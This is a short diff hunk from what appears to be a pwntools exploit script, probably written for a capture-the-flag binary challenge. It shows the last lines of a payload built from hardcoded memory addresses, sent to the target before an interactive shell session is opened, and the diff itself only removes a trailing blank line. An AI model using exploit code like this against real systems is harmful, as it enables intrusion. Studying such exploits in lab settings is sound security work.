@@ -24,4 +24,3 @@ payload += "\xd0\xfe\xe3\xf7\xff\x7f"
 payload += "\xee\xcc\xf7\xf7\xff\x7f"
 r.sendline(payload)
 r.interactive()
-
